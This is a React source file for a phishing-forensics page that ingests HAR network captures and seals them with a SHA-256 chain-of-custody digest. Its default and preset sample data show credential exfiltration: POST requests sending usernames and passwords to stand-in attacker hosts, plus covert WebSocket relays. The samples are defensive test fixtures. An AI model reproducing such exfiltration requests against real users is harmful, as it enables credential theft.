import React, { useState, useEffect } from 'react';
import { api } from '../services/api';
import { useToast } from '../context/ToastContext';
import {
  HARForensicIngest,
  HARForensicArtifact,
  HAREntry
} from '@phishnetra/shared';
import {
  FileCode2,
  ShieldCheck,
  ShieldAlert,
  Fingerprint,
  Copy,
  ExternalLink,
  Layers,
  Terminal,
  Activity,
  History,
  Scale
} from 'lucide-react';

export const DigitalForensicsPage: React.FC = () => {
  const { showToast } = useToast();
  const [targetUrl, setTargetUrl] = useState<string>('https://login.portal-security.com');
  const [capturedBy, setCapturedBy] = useState<string>('PhishNetra Forensic Sandbox Engine');
  const [rawEntriesJson, setRawEntriesJson] = useState<string>(JSON.stringify([
    {
      id: 'entry-1',
      startedDateTime: new Date().toISOString(),
      request: {
        method: 'POST',
        url: 'https://attacker-dropzone-c2.net/harvest',
        headers: [{ name: 'Content-Type', value: 'application/x-www-form-urlencoded' }],
        queryString: [],
        postData: {
          mimeType: 'application/x-www-form-urlencoded',
          text: 'username=executive@phishnetra-corp.com&password=SuperSecretPassword99!'
        }
      },
      response: {
        status: 200,
        statusText: 'OK',
        headers: [],
        content: { size: 16, mimeType: 'text/plain', text: 'received' }
      },
      time: 145
    },
    {
      id: 'entry-2',
      startedDateTime: new Date().toISOString(),
      request: {
        method: 'GET',
        url: 'wss://covert-stealth-relay.biz/stream',
        headers: [],
        queryString: []
      },
      response: {
        status: 101,
        statusText: 'Switching Protocols',
        headers: [],
        content: { size: 0, mimeType: '' }
      },
      time: 60
    }
  ], null, 2));

  const [loading, setLoading] = useState<boolean>(false);
  const [currentArtifact, setCurrentArtifact] = useState<HARForensicArtifact | null>(null);
  const [artifactsList, setArtifactsList] = useState<HARForensicArtifact[]>([]);

  useEffect(() => {
    fetchArtifacts();
  }, []);

  const fetchArtifacts = async () => {
    try {
      const data = await api.listForensicArtifacts();
      setArtifactsList(data);
    } catch {
      // Non-critical background fetch
    }
  };

  const handleIngest = async () => {
    let entries: HAREntry[];
    try {
      entries = JSON.parse(rawEntriesJson);
      if (!Array.isArray(entries)) {
        throw new Error('Entries must be a JSON array of HAR records.');
      }
    } catch (parseErr: any) {
      showToast('error', 'Invalid HAR JSON', parseErr.message);
      return;
    }

    setLoading(true);
    try {
      const artifact = await api.ingestHARForensics({
        targetUrl,
        capturedBy,
        entries,
        environmentDetails: {}
      });
      setCurrentArtifact(artifact);
      showToast('success', 'Forensic Artifact Sealed', `SHA-256 Digest: ${artifact.chainOfCustodySha256.substring(0, 12)}...`);
      fetchArtifacts();
    } catch (err: any) {
      showToast('error', 'Ingestion Failed', err.response?.data?.error || err.message);
    } finally {
      setLoading(false);
    }
  };

  const loadExfilPreset = () => {
    setTargetUrl('https://identity-sso.enterprise-login.com');
    setCapturedBy('PhishNetra Forensic Sandbox Engine');
    setRawEntriesJson(JSON.stringify([
      {
        id: 'entry-exfil',
        startedDateTime: new Date().toISOString(),
        request: {
          method: 'POST',
          url: 'https://attacker-c2-dropzone.biz/harvest',
          headers: [{ name: 'Content-Type', value: 'application/x-www-form-urlencoded' }],
          queryString: [],
          postData: {
            mimeType: 'application/x-www-form-urlencoded',
            text: 'user=admin@bank.com&passwd=StolenPass123!&token=xyz'
          }
        },
        response: { status: 200, statusText: 'OK', headers: [] },
        time: 110
      }
    ], null, 2));
  };

  const loadWebSocketPreset = () => {
    setTargetUrl('https://webmail.secure-portal.com');
    setCapturedBy('Analyst Incident DPI Agent');
    setRawEntriesJson(JSON.stringify([
      {
        id: 'entry-ws',
        startedDateTime: new Date().toISOString(),
        request: {
          method: 'GET',
          url: 'wss://covert-tunnel.dark-infrastructure.org/traffic',
          headers: [],
          queryString: []
        },
        response: { status: 101, statusText: 'Switching Protocols', headers: [] },
        time: 40
      }
    ], null, 2));
  };

  const copyToClipboard = (text: string) => {
    navigator.clipboard.writeText(text);
    showToast('info', 'Copied to Clipboard', text);
  };

  return (
    <div className="min-h-screen bg-slate-950 text-slate-100 p-6 lg:p-8 font-sans">
      <div className="max-w-7xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 pb-6 border-b border-slate-800">
          <div>
            <div className="flex items-center space-x-3">
              <div className="p-2 rounded-xl bg-teal-500/10 border border-teal-500/30 text-teal-400">
                <FileCode2 className="w-5 h-5" />
              </div>
              <h1 className="text-xl font-bold text-white tracking-wide">
                Automated Digital Forensics & HAR Packet Inspection
              </h1>
              <span className="px-2 py-0.5 text-[10px] font-mono uppercase bg-teal-500/20 text-teal-300 border border-teal-500/30 rounded-full font-semibold">
                Milestone 19
              </span>
            </div>
            <p className="mt-2 text-xs text-slate-400 max-w-2xl leading-relaxed">
              Ingests HTTP Archive (HAR) network captures, inspects exfiltration payloads and covert WebSocket channels, and computes a cryptographic SHA-256 chain-of-custody digest for courtroom admissibility.
            </p>
          </div>

          <div className="flex items-center space-x-2">
            <button
              onClick={loadExfilPreset}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold bg-rose-500/20 hover:bg-rose-500/30 text-rose-300 border border-rose-500/30 transition-colors"
            >
              Credential Exfiltration
            </button>
            <button
              onClick={loadWebSocketPreset}
              className="px-3 py-1.5 rounded-lg text-xs font-semibold bg-indigo-500/20 hover:bg-indigo-500/30 text-indigo-300 border border-indigo-500/30 transition-colors"
            >
              Covert WebSocket
            </button>
          </div>
        </div>

        {/* Input & Artifact Grid */}
        <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
          <div className="lg:col-span-2 space-y-4">
            <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-5 space-y-4">
              <span className="text-xs font-bold text-slate-200 uppercase tracking-wider flex items-center space-x-2">
                <Terminal className="w-4 h-4 text-teal-400" />
                <span>HAR Capture Ingest Configuration</span>
              </span>

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                <div>
                  <label className="text-[10px] font-mono text-slate-400 uppercase block mb-1">
                    Target URL
                  </label>
                  <input
                    type="text"
                    value={targetUrl}
                    onChange={e => setTargetUrl(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-teal-500"
                  />
                </div>
                <div>
                  <label className="text-[10px] font-mono text-slate-400 uppercase block mb-1">
                    Capturing Agent / Analyst
                  </label>
                  <input
                    type="text"
                    value={capturedBy}
                    onChange={e => setCapturedBy(e.target.value)}
                    className="w-full bg-slate-950 border border-slate-800 rounded-lg px-2.5 py-1.5 text-xs font-mono text-slate-200 focus:outline-none focus:border-teal-500"
                  />
                </div>
              </div>

              <div>
                <label className="text-[10px] font-mono text-slate-400 uppercase block mb-1">
                  HAR Entries JSON Array
                </label>
                <textarea
                  value={rawEntriesJson}
                  onChange={e => setRawEntriesJson(e.target.value)}
                  rows={8}
                  className="w-full bg-slate-950 border border-slate-800 rounded-xl p-3 text-xs font-mono text-slate-300 focus:outline-none focus:border-teal-500 transition-colors resize-none leading-relaxed"
                />
              </div>

              <div className="flex justify-end pt-2">
                <button
                  onClick={handleIngest}
                  disabled={loading}
                  className="px-5 py-2 rounded-xl text-xs font-bold bg-gradient-to-r from-teal-500 to-cyan-600 hover:from-teal-400 hover:to-cyan-500 text-white shadow-lg shadow-teal-500/20 transition-all flex items-center space-x-2 disabled:opacity-50"
                >
                  <Fingerprint className="w-3.5 h-3.5" />
                  <span>{loading ? 'Analyzing DPI...' : 'Seal Forensic Artifact'}</span>
                </button>
              </div>
            </div>

            {/* Forensic Findings Table */}
            {currentArtifact && currentArtifact.forensicFindings.length > 0 && (
              <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-5 space-y-3">
                <div className="flex items-center space-x-2 text-xs font-bold text-slate-200 uppercase tracking-wider">
                  <ShieldAlert className="w-4 h-4 text-rose-400" />
                  <span>DPI Forensic Findings ({currentArtifact.forensicFindings.length})</span>
                </div>
                <div className="space-y-2">
                  {currentArtifact.forensicFindings.map((finding, idx) => (
                    <div
                      key={idx}
                      className="p-3 rounded-xl bg-slate-950 border border-slate-800/80 space-y-1.5 text-xs"
                    >
                      <div className="flex items-center justify-between">
                        <span className="font-mono font-bold text-rose-400 text-[11px]">
                          {finding.threatCategory}
                        </span>
                        <span
                          className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold ${
                            finding.severity === 'CRITICAL'
                              ? 'bg-rose-500/20 text-rose-300 border border-rose-500/30'
                              : 'bg-amber-500/20 text-amber-300 border border-amber-500/30'
                          }`}
                        >
                          {finding.severity}
                        </span>
                      </div>
                      <div className="font-mono text-slate-300 text-[11px] truncate">
                        {finding.method} {finding.url}
                      </div>
                      <div className="text-slate-400 text-[11px]">
                        {finding.evidenceSnippet}
                      </div>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>

          {/* Chain-of-Custody & Admissibility Card */}
          <div className="space-y-4">
            {currentArtifact ? (
              <div className="bg-slate-900/60 border border-slate-800 rounded-2xl p-5 space-y-5 animate-in fade-in">
                <div className="flex items-center justify-between">
                  <span className="text-xs font-bold text-slate-300 uppercase tracking-wider">
                    Chain of Custody
                  </span>
                  <span className="px-2 py-0.5 rounded-full text-[10px] font-bold font-mono bg-teal-500/20 text-teal-300 border border-teal-500/30">
                    SEALED & VERIFIED
                  </span>
                </div>

                <div className="p-4 rounded-xl bg-slate-950 border border-slate-800/80 space-y-3">
                  <div>
                    <span className="text-[10px] font-mono text-slate-400 uppercase block mb-1">
                      Artifact ID
                    </span>
                    <span className="font-mono text-xs text-white">
                      {currentArtifact.artifactId}
                    </span>
                  </div>

                  <div>
                    <div className="flex items-center justify-between mb-1">
                      <span className="text-[10px] font-mono text-slate-400 uppercase">
                        SHA-256 Digest
                      </span>
                      <button
                        onClick={() => copyToClipboard(currentArtifact.chainOfCustodySha256)}
                        className="text-[10px] text-teal-400 hover:text-teal-300 flex items-center space-x-1"
                      >
                        <Copy className="w-3 h-3" />
                        <span>Copy</span>
                      </button>
                    </div>
                    <div className="p-2 rounded bg-slate-900 border border-slate-800 font-mono text-[10px] text-teal-300 break-all select-all">
                      {currentArtifact.chainOfCustodySha256}
                    </div>
                  </div>

                  <div className="flex items-center justify-between text-xs pt-2">
                    <span className="text-slate-400">Legal Admissibility Score</span>
                    <span className="font-mono font-bold text-teal-400">
                      {currentArtifact.legalAdmissibilityScore} / 100
                    </span>
                  </div>

                  <div className="flex items-center justify-between text-xs">
                    <span className="text-slate-400">Analyzed Entries</span>
                    <span className="font-mono text-slate-200">
                      {currentArtifact.totalEntriesAnalyzed}
                    </span>
                  </div>

                  <div className="flex items-center justify-between text-xs">
                    <span className="text-slate-400">Covert WebSockets</span>
                    <span className="font-mono font-bold text-purple-400">
                      {currentArtifact.covertWebSocketStreams}
                    </span>
                  </div>
                </div>

                {/* Exfiltration Destinations */}
                <div className="space-y-2">
                  <span className="text-[10px] font-mono uppercase text-slate-400">
                    Exfiltration Destinations ({currentArtifact.exfiltrationDestinations.length})
                  </span>
                  {currentArtifact.exfiltrationDestinations.length > 0 ? (
                    <div className="space-y-1.5">
                      {currentArtifact.exfiltrationDestinations.map((dest, idx) => (
                        <div
                          key={idx}
                          className="p-2 rounded-lg bg-rose-500/10 border border-rose-500/20 text-rose-300 text-xs font-mono break-all"
                        >
                          {dest}
                        </div>
                      ))}
                    </div>
                  ) : (
                    <div className="p-3 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-300 text-xs flex items-center space-x-2">
                      <ShieldCheck className="w-4 h-4 text-emerald-400" />
                      <span>No unauthorized cross-origin exfiltration endpoints found.</span>
                    </div>
                  )}
                </div>
              </div>
            ) : (
              <div className="bg-slate-900/40 border border-slate-800/60 rounded-2xl p-6 text-center text-slate-500 space-y-2">
                <FileCode2 className="w-8 h-8 mx-auto opacity-30 text-teal-400" />
                <p className="text-xs">
                  Ingest a HAR capture to generate a cryptographically sealed forensic artifact.
                </p>
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};
